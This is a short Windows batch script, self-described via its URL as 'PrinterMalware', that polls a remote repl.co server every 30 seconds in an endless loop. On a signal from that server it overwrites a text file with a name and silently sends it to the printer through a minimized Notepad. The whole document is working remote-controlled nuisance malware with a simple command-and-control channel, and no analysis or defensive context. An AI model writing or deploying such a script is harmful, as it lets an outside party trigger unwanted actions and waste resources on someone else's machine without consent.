:x
FOR /F "tokens=*" %%g IN ('curl -0 "https://PrinterMalware.wraient.repl.co/doit/"') do (SET VAR=%%g)
if %VAR%==0 echo ""
if %VAR%==1 del test.txt
if %VAR%==1 echo sonakshi >> test.txt
if %VAR%==1 start /min notepad.exe /p test.txt
timeout /t 30
goto x
